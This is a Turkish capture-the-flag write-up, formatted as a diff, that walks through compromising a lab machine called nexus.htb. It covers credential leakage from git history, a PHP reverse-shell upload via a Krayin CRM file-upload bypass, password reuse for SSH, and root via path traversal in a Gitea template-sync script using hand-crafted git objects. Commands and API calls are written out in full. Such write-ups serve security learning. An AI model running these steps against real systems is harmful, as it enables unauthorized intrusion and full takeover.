@@ -1,1 +1,118 @@
+Klasik nmap ile başladım, 22 ve 80 açık. 80'e gittiğimde `nexus.htb`'ye redirect attı, hosts'a ekledim.
 
+echo "10.129.234.54 nexus.htb" | sudo tee -a /etc/hosts
+
+Site bir enerji şirketinin sayfasıydı. Careers kısmında iş ilanına baktım, iki mail adresi vardı: `careers@nexus.htb` ve `j.matthew@nexus.htb`. İkincisi önemliydi, kullanıcı adı olarak aklımda kaldı.
+
+Vhost fuzzing yaptım:
+
+ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ \
+  -u http://nexus.htb/ -H "Host: FUZZ.nexus.htb" -fw 4
+
+git.nexus.htb` ve `billing.nexus.htb` çıktı.
+
+## Foothold
+
+`git.nexus.htb`'de Gitea instance'ı vardı. Repoları gezerken `krayin-docker-setup` adında biri dikkatimi çekti. `.env` dosyasını açtım, boştu ama commit geçmişine baktım ve önceki committe şifre düz yazılmıştı.
+
+`billing.nexus.htb`'ye girip Krayin CRM gördüm. `j.matthew@nexus.htb` + commit'teki şifreyle login oldum, içeri girdim. Versiyon 2.2.0.
+
+CVE-2026-38526'yı araştırdım. Krayin'in mail ekranında dosya upload var, PNG olarak yüklüyorsun ama Burp'ta isteği yakalayıp uzantıyı `.php`'ye çeviriyorsun. Sunucu doğrulama yapmıyor.
+
+Php reverse shell yükleyip Burp'ta rename ettim, sonra shell'in URL'sine gittim:
+
+```
+http://billing.nexus.htb/storage/tinymce/<hash>.php
+```
+
+`nc -lnvp 4455` ile bağlantıyı aldım, `www-data` olarak içerideydim.
+
+Shell'i stabil hale getirdim:
+
+
+script /dev/null -c /bin/bash
+
+
+Krayin'in `.env` dosyasına baktım:
+
+
+DB_PASSWORD=y27xb3ha!!74GbR
+
+
+`/etc/passwd`'da `jones` kullanıcısı vardı. Bu şifreyi SSH'ta denedim, girdi.
+
+
+ssh jones@nexus.htb
+# şifre: y27xb3ha!!74GbR
+
+
+`user.txt` masaüstündeydi, aldım.
+
+
+
+## Privilege Escalation
+
+`systemctl list-timers` çekince her 2 dakikada çalışan `gitea-template-sync` servisi gözüme çarptı.
+
+`/etc/gitea/template-sync.py`'yi okudum. Script, Gitea'daki template olarak işaretlenmiş repoları çekip dosyalarını `/home/git/template-staging/<owner>/<repo>/` altına kopyalıyor. Kritik nokta şu: `git ls-tree` çıktısındaki dosya yollarını `os.path.join()` ile birleştiriyor ama herhangi bir sanitizasyon yok.
+
+
+target = os.path.join(stage_path, filepath)
+
+
+`stage_path` = `/home/git/template-staging/jones/rce/`  
+`filepath` = `../../../../../root/.ssh/authorized_keys`  
+
+`os.path.join()` bunu mutlu mesut birleştiriyor ve dosyayı oraya yazıyor.
+
+Normal `git add` ile `..` içeren path ekleyemezsin, git'in `verify_path()` fonksiyonu blokluyor. Ama git objelerini elle yazarsan bu kontrol yok.
+
+Şöyle yaptım:
+
+**1. SSH key üret:**
+
+ssh-keygen -t ed25519 -f /tmp/.k -N ''
+
+**2. Gitea'da `rce` adında bir repo oluştur, template olarak işaretle.**
+
+API ile de yapılabilir:
+
+```bash
+curl -s -X POST http://git.nexus.htb/api/v1/user/repos \
+  -u 'jones:y27xb3ha!!74GbR' \
+  -H 'Content-Type: application/json' \
+  -d '{"name":"rce","is_template":true}'
+
+curl -s -X PATCH http://git.nexus.htb/api/v1/repos/jones/rce \
+  -u 'jones:y27xb3ha!!74GbR' \
+  -H 'Content-Type: application/json' \
+  -d '{"is_template":true}'
+```
+
+**3. Repoyu klonla:**
+
+cd /tmp
+git clone http://jones:'y27xb3ha!!74GbR'@git.nexus.htb/jones/rce.git
+cd rce
+touch README.md
+
+**4. `build.py`'yi çalıştır:**
+
+Script, `authorized_keys` içeriğini blob olarak yaratıyor, üstüne `.ssh` → `root` → `..` → `..` → `..` → `..` şeklinde tree objelerini iç içe oluşturuyor. Toplam 5 seviye traversal ile `/home/git/template-staging/jones/rce/` içinden `/root/` çıkıyor. Bu objeleri doğrudan `.git/objects/` altına yazarak git'in path validasyonunu atlatıyor.
+
+
+python3 /tmp/build.py
+git push -u origin main --force
+
+**5. Timer'ı bekle:**
+
+# max 2 dakika
+watch -n 5 'ssh -i /tmp/.k -o StrictHostKeyChecking=no root@nexus.htb id 2>/dev/null'
+
+
+Timer çalışınca `/root/.ssh/authorized_keys`'e key yazıldı.
+
+**6. Root:**
+
+ssh -i /tmp/.k root@nexus.htb
+cat /root/root.txt
